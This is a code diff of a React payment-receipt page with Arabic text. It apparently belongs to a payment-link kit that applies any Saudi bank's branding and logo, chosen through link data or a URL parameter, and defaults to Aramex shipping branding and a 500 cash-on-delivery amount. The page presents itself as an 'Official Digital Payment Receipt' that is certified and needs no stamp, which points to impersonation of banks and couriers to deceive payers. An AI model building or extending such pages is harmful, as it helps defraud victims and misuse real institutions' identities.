@@ -1,200 +1,169 @@
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
+import { useLinkData } from "@/hooks/useLinkData";
+import { CheckCircle2, Download, Share2, ArrowRight, Printer, ShieldCheck, Calendar, Hash, CreditCard, Building2, User } from "lucide-react";
+import { bankBranding } from "@/lib/brandingSystem";
+import { getBankById } from "@/lib/banks";
+import { getCountryByCode } from "@/lib/countries";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import BankLogo from "@/components/BankLogo";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useSupabase";
-import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
+  const [searchParams] = useSearchParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
-  
-  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as Record<string, unknown>;
+  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
 
-  // Get amount from link data - ensure it's a number, handle all data types
-  const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
-
-  const formattedAmount = `${amount} ر.س`;
+  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
+  const selectedBankBranding = (selectedBankId && bankBranding[selectedBankId]) ? bankBranding[selectedBankId] : bankBranding.default || bankBranding.alrajhi_bank;
+  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;
+  const branding = getServiceBranding(linkData?.payload?.service_key || "aramex");
   
-  const handleDownload = () => {
-    // Create a simple receipt content
-    const receiptContent = `
-إيصال دفع - ${serviceName}
-=====================================
-رقم المعاملة: ${id}
-التاريخ: ${new Date().toLocaleString('ar-SA')}
-المبلغ: ${formattedAmount}
-اسم العميل: ${customerInfo.name || 'غير محدد'}
-الهاتف: ${customerInfo.phone || 'غير محدد'}
-البريد الإلكتروني: ${customerInfo.email || 'غير محدد'}
-    `.trim();
-    
-    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = `receipt-${id}.txt`;
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    URL.revokeObjectURL(url);
-  };
-  
+  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
+  const rawAmount = linkData?.payload?.cod_amount || 500;
+  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
+  const selectedCountryData = getCountryByCode(selectedCountry);
+
+  if (linkLoading || !linkData) return null;
+
+  const primaryColor = selectedBankBranding.colors.primary;
+  const secondaryColor = selectedBankBranding.colors.secondary;
+  const refNumber = `TRX-${id?.slice(0, 8).toUpperCase()}`;
+
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="إيصال الدفع"
-      description={`تم الدفع بنجاح لخدمة ${serviceName}`}
-      icon={<CheckCircle className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-      showHero={false}
-    >
-      {/* Success Icon */}
-      <div className="text-center mb-6 sm:mb-8">
-        <div 
-          className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
-        </div>
-        <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary }}>
-          تم الدفع بنجاح!
-        </h1>
-        <p className="text-sm sm:text-base text-muted-foreground">
-          شكراً لك على استخدام خدمة {serviceName}
-        </p>
-      </div>
+    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl" style={{ fontFamily: selectedBankBranding.fonts.arabic }}>
+      <PaymentMetaTags
+        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
+        serviceName={selectedBank?.nameAr || "البنك"}
+        title="إيصال الدفع الإلكتروني"
+      />
 
-      {/* Receipt Details */}
-      <Card className="p-4 sm:p-6 mb-6" style={{ borderColor: branding.colors.primary }}>
-        <div className="space-y-4">
-          {/* Transaction ID */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <div className="flex items-center gap-2">
-              <Hash className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">رقم المعاملة</span>
+      <header className="bg-white border-b-4 h-16 sm:h-20 flex items-center sticky top-0 z-50 shadow-md" style={{ borderBottomColor: primaryColor }}>
+         <div className="container mx-auto px-4 flex items-center justify-between">
+            <div className="w-32 sm:w-40 h-10 flex items-center">
+               {selectedBankId ? (
+                 <BankLogo bankId={selectedBankId} bankName={selectedBank?.name || ""} bankNameAr={selectedBank?.nameAr || ""} size="md" />
+               ) : (
+                 <div className="flex items-center gap-2 text-primary font-black">
+                   <ShieldCheck className="w-6 h-6" />
+                   <span>SECURE RECEIPT</span>
+                 </div>
+               )}
             </div>
-            <span className="font-mono text-sm">{id}</span>
-          </div>
-          
-          {/* Date */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <div className="flex items-center gap-2">
-              <Calendar className="w-4 h-4 text-muted-foreground" />
-              <span className="text-sm font-medium">التاريخ والوقت</span>
+            <div className="flex items-center gap-4">
+               <button onClick={() => window.print()} className="p-2 text-gray-400 hover:text-primary transition-colors">
+                  <Printer className="w-5 h-5" />
+               </button>
+               <div className="h-6 w-px bg-gray-200" />
+               <Button variant="ghost" size="sm" className="font-bold text-xs" onClick={() => navigate('/')}>
+                  خروج
+               </Button>
             </div>
-            <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
-          </div>
-          
-          {/* Service */}
-          <div className="flex items-center justify-between py-2 border-b">
-            <span className="text-sm font-medium">الخدمة</span>
-            <span className="text-sm font-semibold">{serviceName}</span>
-          </div>
-          
-          {/* Amount */}
-          <div className="flex items-center justify-between py-3">
-            <span className="text-lg font-bold">المبلغ المدفوع</span>
-            <span className="text-2xl font-bold" style={{ color: branding.colors.primary }}>
-              {formattedAmount}
-            </span>
-          </div>
-        </div>
-      </Card>
+         </div>
+      </header>
 
-      {/* Customer Info */}
-      <Card className="p-4 sm:p-6 mb-6">
-        <h3 className="font-semibold mb-4 text-sm sm:text-base">تفاصيل العميل</h3>
-        <div className="space-y-2 text-sm">
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الاسم:</span>
-            <span>{customerInfo.name || 'غير محدد'}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">الهاتف:</span>
-            <span>{customerInfo.phone || 'غير محدد'}</span>
-          </div>
-          <div className="flex justify-between">
-            <span className="text-muted-foreground">البريد الإلكتروني:</span>
-            <span>{customerInfo.email || 'غير محدد'}</span>
-          </div>
-          {customerInfo.address && (
-            <div className="flex justify-between">
-              <span className="text-muted-foreground">العنوان:</span>
-              <span className="text-right max-w-[200px]">{customerInfo.address}</span>
+      <main className="flex-1 container mx-auto px-4 py-12 max-w-xl">
+         <div className="text-center mb-10 space-y-4">
+            <div className="w-24 h-24 rounded-full bg-green-50 flex items-center justify-center mx-auto shadow-inner border border-green-100 animate-in zoom-in duration-700">
+               <CheckCircle2 className="w-14 h-14 text-green-500" />
             </div>
-          )}
-        </div>
-      </Card>
+            <div className="space-y-1">
+               <h1 className="text-3xl font-black text-slate-900 tracking-tight">تمت العملية بنجاح</h1>
+               <p className="text-sm font-bold text-gray-400 uppercase tracking-widest">Payment Successfully Processed</p>
+            </div>
+         </div>
 
-      {/* Payment Method */}
-      <Card className="p-4 sm:p-6 mb-6">
-        <h3 className="font-semibold mb-4 text-sm sm:text-base">طريقة الدفع</h3>
-        <div className="flex items-center gap-3">
-          <CreditCard className="w-5 h-5" style={{ color: branding.colors.primary }} />
-          <div>
-            <p className="font-medium">بطاقة ائتمان</p>
-            <p className="text-sm text-muted-foreground">
-              **** **** **** {sessionStorage.getItem('cardLast4') || '****'}
-            </p>
-          </div>
-        </div>
-      </Card>
+         <Card className="border-none shadow-[0_40px_100px_-20px_rgba(0,0,0,0.1)] rounded-[3rem] overflow-hidden bg-white relative print:shadow-none">
+            <div className="absolute top-0 left-0 w-full h-2" style={{ backgroundColor: primaryColor }} />
 
-      {/* Action Buttons */}
-      <div className="space-y-3">
-        <Button
-          onClick={handleDownload}
-          variant="outline"
-          className="w-full"
-          style={{
-            borderColor: branding.colors.primary,
-            color: branding.colors.primary
-          }}
-        >
-          <Download className="w-4 h-4 ml-2" />
-          تحميل الإيصال
-        </Button>
-        
-        <Button
-          onClick={() => navigate('/')}
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
-        >
-          <span className="ml-2">العودة للرئيسية</span>
-          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-        </Button>
-      </div>
-      
-      <p className="text-xs text-center text-muted-foreground mt-6">
-        سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
-      </p>
-    </DynamicPaymentLayout>
+            <div className="p-10 sm:p-12 text-center border-b border-dashed bg-slate-50/50">
+               <p className="text-[11px] font-black text-slate-400 uppercase tracking-[0.2em] mb-3">قيمة العملية</p>
+               <h2 className="text-5xl font-black text-slate-900 tracking-tighter mb-4">{formattedAmount}</h2>
+               <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-green-50 text-green-700 border border-green-100 text-[10px] font-black">
+                  <ShieldCheck className="w-3.5 h-3.5" />
+                  <span>عملية معتمدة وآمنة</span>
+               </div>
+            </div>
+
+            <div className="p-10 sm:p-12 space-y-8">
+               <div className="grid grid-cols-1 gap-6">
+                  <div className="flex items-center justify-between py-1">
+                     <div className="flex items-center gap-3 text-slate-400">
+                        <Hash className="w-4 h-4" />
+                        <span className="text-[11px] font-black uppercase tracking-wider">رقم المرجع</span>
+                     </div>
+                     <span className="font-bold text-slate-700 font-mono">{refNumber}</span>
+                  </div>
+
+                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
+                     <div className="flex items-center gap-3 text-slate-400">
+                        <Calendar className="w-4 h-4" />
+                        <span className="text-[11px] font-black uppercase tracking-wider">التاريخ والوقت</span>
+                     </div>
+                     <span className="font-bold text-slate-700">{new Date().toLocaleString('ar-SA')}</span>
+                  </div>
+
+                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
+                     <div className="flex items-center gap-3 text-slate-400">
+                        <Building2 className="w-4 h-4" />
+                        <span className="text-[11px] font-black uppercase tracking-wider">الجهة المستفيدة</span>
+                     </div>
+                     <span className="font-bold text-slate-700">{linkData?.payload?.service_name || branding.name}</span>
+                  </div>
+
+                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
+                     <div className="flex items-center gap-3 text-slate-400">
+                        <User className="w-4 h-4" />
+                        <span className="text-[11px] font-black uppercase tracking-wider">اسم العميل</span>
+                     </div>
+                     <span className="font-bold text-slate-700">{linkData?.payload?.customerInfo?.name || linkData?.payload?.customerInfo?.fullName || 'غير متوفر'}</span>
+                  </div>
+
+                  <div className="flex items-center justify-between py-1 border-t border-slate-50 pt-6">
+                     <div className="flex items-center gap-3 text-slate-400">
+                        <CreditCard className="w-4 h-4" />
+                        <span className="text-[11px] font-black uppercase tracking-wider">طريقة الدفع</span>
+                     </div>
+                     <span className="font-bold text-slate-700">{selectedBank?.nameAr || 'بطاقة بنكية'}</span>
+                  </div>
+               </div>
+
+               <div className="pt-10 flex gap-4 print:hidden">
+                  <Button className="flex-1 h-16 rounded-2xl font-black text-lg shadow-xl gap-3" style={{ backgroundColor: primaryColor }}>
+                     <Download className="w-5 h-5" />
+                     <span>حفظ الإيصال</span>
+                  </Button>
+                  <Button variant="outline" className="h-16 w-16 rounded-2xl border-2 hover:bg-slate-50 transition-colors">
+                     <Share2 className="w-6 h-6 text-slate-400" />
+                  </Button>
+               </div>
+            </div>
+
+            <div className="bg-slate-50 p-8 text-center space-y-4">
+               <div className="flex items-center justify-center gap-3 opacity-40 grayscale h-5">
+                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-full" />
+                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-full" />
+                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-full" />
+               </div>
+               <p className="text-[9px] font-bold text-slate-400 uppercase tracking-[0.3em]">Official Digital Payment Receipt</p>
+            </div>
+         </Card>
+
+         <div className="mt-12 flex flex-col items-center gap-6 print:hidden">
+            <Button variant="link" className="font-black text-slate-400 hover:text-primary transition-colors flex items-center gap-2" onClick={() => navigate('/')}>
+               <span>العودة للرئيسية</span>
+               <ArrowRight className="w-4 h-4" />
+            </Button>
+            <div className="flex items-center gap-3 p-4 bg-white/50 rounded-2xl border border-dashed text-slate-400">
+               <ShieldCheck className="w-5 h-5 text-primary" />
+               <p className="text-[10px] font-bold leading-relaxed uppercase tracking-tighter">إيصال إلكتروني موثق لا يحتاج إلى ختم أو توقيع.</p>
+            </div>
+         </div>
+      </main>
+    </div>
   );
 };
 
